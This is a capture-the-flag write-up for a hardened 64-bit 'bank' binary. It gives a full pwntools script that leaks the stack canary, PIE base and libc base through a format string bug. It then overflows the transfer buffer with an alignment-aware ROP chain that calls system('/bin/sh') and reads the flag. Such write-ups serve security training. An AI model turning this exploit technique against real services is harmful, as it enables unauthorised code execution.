# Challenge - The Alignment Trap 

- Category: Pwn  
- Difficulty: Hard  

This challenge is a hardened 64‑bit Linux binary that behaves like a simple “bank” service, but under the hood it’s compiled with modern mitigations (PIE, NX, stack canary, etc.). The core bug is a **format string vulnerability** that lets us leak the stack canary, PIE base, and libc base, then pivot to a classic `system("/bin/sh")` ROP chain. The “alignment trap” in the name refers to needing a **stack‑alignment `ret` gadget** to keep `system` happy on amd64.

---

## 1. Binary Overview

The provided files:

- `bank` — ELF binary for the service.
- `libc.so.6` — matching glibc for remote.
- `ld-linux-x86-64.so.2` — loader for local testing.

At a high level, the service:

- Presents a menu (e.g. check balance, transfer funds, etc.).
- Uses a stack‑based buffer to store “memo” / “transfer details”.
- Contains a `printf`‑style vulnerability when printing an account memo, allowing arbitrary format specifiers.
- Uses a stack canary and is PIE, so a naive buffer overflow without leaks will fail.

Our exploit must:

1. Leak **canary**, **PIE base**, and **libc base** via the format string.
2. Build a ROP chain in `libc` that calls `system("/bin/sh")`.
3. Preserve stack alignment by inserting a standalone `ret` gadget.
4. Overwrite the saved return address in the “transfer” path while keeping the canary intact.

---

## 2. Exploit Script (My Solution)

Here is the Python script I used, built with pwntools:

```python
#!/usr/bin/env python3
from pwn import *
from pathlib import Path
import sys, time

context.arch = 'amd64'
context.log_level = 'info'

BASE = Path(__file__).resolve().parent
BIN = BASE / 'bank'
LIBC_PATH = BASE / 'libc.so.6'
LD_PATH = BASE / 'ld-linux-x86-64.so.2'

# fallback for this sandbox layout
if not BIN.exists() and Path('/mnt/data/bank/bank').exists():
    BASE = Path('/mnt/data/bank')
    BIN = BASE / 'bank'
    LIBC_PATH = BASE / 'libc.so.6'
    LD_PATH = BASE / 'ld-linux-x86-64.so.2'

elf = ELF(str(BIN), checksec=False) if BIN.exists() else None
libc = ELF(str(LIBC_PATH), checksec=False)

RET_AFTER_CHECK_BALANCE = 0x15e7
LIBC_LEAK_OFF = 0x29d90
CANARY_IDX = 25
PIE_IDX = 27
LIBC_IDX = 33
BUF_TO_CANARY = 72


def start():
    args = sys.argv[1:]
    if not args or args.lower() == 'local':
        if LD_PATH.exists():
            return process([str(LD_PATH), '--library-path', str(BASE), str(BIN)])
        return process([str(BIN)], env={'LD_LIBRARY_PATH': str(BASE)})

    host = args
    port = 443
    use_ssl = True

    for a in args[1:]:
        if a == '--no-ssl':
            use_ssl = False
        elif a == '--ssl':
            use_ssl = True
        else:
            port = int(a)

    log.info(f'connecting to {host}:{port} ssl={use_ssl}')
    return remote(host, port, ssl=use_ssl, sni=host if use_ssl else None)


def leak(p):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'Enter account memo: ')

    fmt = f'%{CANARY_IDX}$p.%{PIE_IDX}$p.%{LIBC_IDX}$p'.encode()
    p.sendline(fmt)

    out = p.recvuntil(b'Balance:', timeout=5)
    line = out.split(b'Account Holder: ').split(b'\n')[1]
    canary_s, pie_s, libc_s = line.split(b'.')

    canary = int(canary_s, 16)
    pie_base = int(pie_s, 16) - RET_AFTER_CHECK_BALANCE
    libc_base = int(libc_s, 16) - LIBC_LEAK_OFF

    log.success(f'canary    = {canary:#x}')
    log.success(f'pie_base  = {pie_base:#x}')
    log.success(f'libc_base = {libc_base:#x}')
    return canary, pie_base, libc_base


def exploit(p):
    canary, pie_base, libc_base = leak(p)

    rop = ROP(libc)
    ret = libc_base + rop.find_gadget(['ret']).address
    pop_rdi = libc_base + rop.find_gadget(['pop rdi', 'ret']).address
    binsh = libc_base + next(libc.search(b'/bin/sh'))
    system = libc_base + libc.sym.system

    log.success(f'pop rdi   = {pop_rdi:#x}')
    log.success(f'system    = {system:#x}')
    log.success(f'/bin/sh   = {binsh:#x}')

    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'Enter transfer details: ')

    payload  = b'A' * BUF_TO_CANARY
    payload += p64(canary)
    payload += b'B' * 8
    payload += p64(ret)       # stack alignment
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(system)

    p.send(payload)

    # Important: wait until read() has returned before sending shell commands.
    p.recvuntil(b'Transfer complete.\n\n', timeout=5)
    time.sleep(0.15)

    p.sendline(b'echo PWNED; id; cat /flag.txt; echo END')
    data = p.recvuntil(b'END', timeout=5)
    print(data.decode(errors='ignore'))

    p.interactive()


if __name__ == '__main__':
    p = start()
    exploit(p)
```

We can run it locally (`./exploit.py local`) or against the remote (`./exploit.py host.name 443`).

---

## 3. Vulnerability and Leaks

### 3.1 Format String in “Check Balance”

Menu option `1` (“check balance”) asks for an **account memo**, then prints it in a context where the memo is passed directly to a `printf`-style function without proper format control.

By sending a format string like:

```text
%25$p.%27$p.%33$p
```

we get:

- Stack argument 25: stack canary.
- Stack argument 27: a return address in the PIE binary (inside `check_balance`).
- Stack argument 33: a libc address (often a function pointer or return address in glibc).

The script wraps this in:

```python
fmt = f'%{CANARY_IDX}$p.%{PIE_IDX}$p.%{LIBC_IDX}$p'.encode()
```

Then receives output and parses the line:

```python
line = out.split(b'Account Holder: ').split(b'\n')[1]
canary_s, pie_s, libc_s = line.split(b'.')
```

Each value is interpreted as a hex pointer:

```python
canary = int(canary_s, 16)
pie_base = int(pie_s, 16) - RET_AFTER_CHECK_BALANCE
libc_base = int(libc_s, 16) - LIBC_LEAK_OFF
```

The constants:

- `RET_AFTER_CHECK_BALANCE` — offset of the leaked PIE return address inside the bank binary.
- `LIBC_LEAK_OFF` — offset of the leaked libc symbol/address.

Subtracting these gives:

- **PIE base** (needed if we wanted gadgets from the binary itself).
- **libc base** (needed for ROP using libc gadgets).

The canary value is then reused in the overflow payload to avoid crashing.

### 3.2 Stack Layout and Buffer Sizes

From the script:

- `BUF_TO_CANARY = 72` — number of bytes from the start of the vulnerable buffer up to the stack canary.
- After those 72 bytes:

  - 8 bytes: stack canary.
  - 8 bytes: saved RBP (or another stack slot).
  - 8 bytes: saved RIP (return address).

Our payload:

```python
payload  = b'A' * BUF_TO_CANARY
payload += p64(canary)        # correct canary
payload += b'B' * 8           # overwrite saved RBP
payload += p64(ret)           # alignment gadget
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
```

This ensures:

- Canary remains intact (no stack smashing detection).
- Return value is entirely under our control, starting from `ret`.

---

## 4. ROP Chain and Alignment Trap

### 4.1 Finding Gadgets

With `libc_base` computed, we use pwntools’ `ROP` helper:

```python
rop = ROP(libc)
ret = libc_base + rop.find_gadget(['ret']).address
pop_rdi = libc_base + rop.find_gadget(['pop rdi', 'ret']).address
binsh = libc_base + next(libc.search(b'/bin/sh'))
system = libc_base + libc.sym.system
```

We need:

- `ret` — single `ret` instruction for **16‑byte stack alignment** (important on AMD64 System V ABI; misalignment can break some libc routines).
- `pop rdi; ret` — to set up the first argument for `system`.
- `/bin/sh` string in libc — search for that bytes sequence.
- `system` address — for code execution.

### 4.2 Alignment

On amd64, for some functions (including certain GLIBC routines), the stack must be 16‑byte aligned at call time. If our ROP chain isn’t aligned, `system` can misbehave or crash.

Hence:

```python
payload += p64(ret)       # stack alignment
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
```

When the vulnerable function returns, execution flow is:

1. Jump to `ret` (alignment gadget).
2. Then to `pop_rdi; ret`.
3. Then to `system`.

By inserting the extra `ret`, we ensure the stack pointer is correctly aligned when `system` is reached — avoiding the “alignment trap” that gives the challenge its name.

---

## 5. Triggering the Overflow

The overflow occurs in the “transfer” path (menu option `2`):

```python
p.recvuntil(b'> ')
p.sendline(b'2')
p.recvuntil(b'Enter transfer details: ')
p.send(payload)
```

The function reading “transfer details” uses a vulnerable input routine that doesn’t respect the stack frame boundaries, allowing us to overwrite:

- Bytes up to the canary.
- The canary itself (which we restore correctly).
- Saved RBP.
- Saved RIP.

After sending the payload, the function prints something like `"Transfer complete.\n\n"` and returns, which triggers our ROP chain.

### 5.1 Shell Commands and Timing

One subtlety: the program uses buffered I/O, so it’s important not to send shell commands too early (they could be consumed by the application’s own reads). The script therefore:

```python
p.recvuntil(b'Transfer complete.\n\n', timeout=5)
time.sleep(0.15)
p.sendline(b'echo PWNED; id; cat /flag.txt; echo END')
data = p.recvuntil(b'END', timeout=5)
print(data.decode(errors='ignore'))
p.interactive()
```

We wait until the transfer path has fully finished and control has returned to our ROP chain (`system("/bin/sh")`), then send commands to:

- Confirm pwn (`echo PWNED`).
- Show user (`id`).
- Read the flag (`cat /flag.txt`).

Finally, we drop into an interactive shell.

---

## 6. Key Points and Lessons

- **Format string** bugs are extremely powerful: here they bypass PIE and stack canary by leaking all necessary runtime values.
- Stack canaries don’t help if you can **leak the canary** and then use it in your payload.
- On AMD64, the need for **stack alignment** is often overlooked; a simple `ret` gadget can be the difference between a stable exploit and random crashes.
- Even heavily protected binaries (PIE, NX, canary, custom loader) can be beaten with a relatively straightforward ROP chain once you have **info leaks**.

This exploit is a clean example of combining:

- Info leak via format string.
- Careful offset calculations to derive bases.
- Stack‑safe buffer overflow.
- Alignment‑aware ROP to call `system("/bin/sh")`.
